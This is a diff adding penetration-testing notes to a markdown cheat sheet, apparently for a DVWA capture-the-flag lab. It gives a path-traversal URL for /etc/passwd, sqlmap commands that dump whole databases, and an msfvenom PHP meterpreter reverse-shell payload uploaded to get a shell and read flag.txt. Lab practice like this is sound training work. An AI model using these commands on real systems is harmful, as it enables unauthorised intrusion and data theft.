@@ -249,5 +249,29 @@ https://example.com/view?file=images/cat.jpg
 If the server is not validating the file path properly, an attacker could do:
 https://example.com/view?file=../../../../etc/passwd
 ```
-
-
+#### Page_id = X
+```bash
+1. nmap -sV --script=http-enum [target domain or IP address] 
+2. Find any input parameter on website and capture the request in burp and then use it to perform sql 
+injection using sqlmap. 
+3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” 
+you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 
+4. sqlmap -r <txt file from burpsuite> --dbs  
+5. sqlmap -r <txt file from burpsuite> -D <database name> --tables 
+6. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns 
+7. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all 
+8. then login and do the url parameter change page_id=1 to page_id=84
+```
+#### Exploit web application and find flag.txt
+```bash
+1. Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/ File inclusion 
+vulnerability on DVWA. 
+2. msfconsole in one tab next in new tab 
+3. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 -f raw >exploit.php 
+4. >use exploit/multi/handler or use 30 
+5. >set payload php/meterpreter/reverse_tcp 
+6. Set LHOST ipadd 
+7. Upload a file you created as exploit.php 
+8. Open terminal and type run once you get url type url in brower you get meterpreter session then type ls 
+get the files.
+```
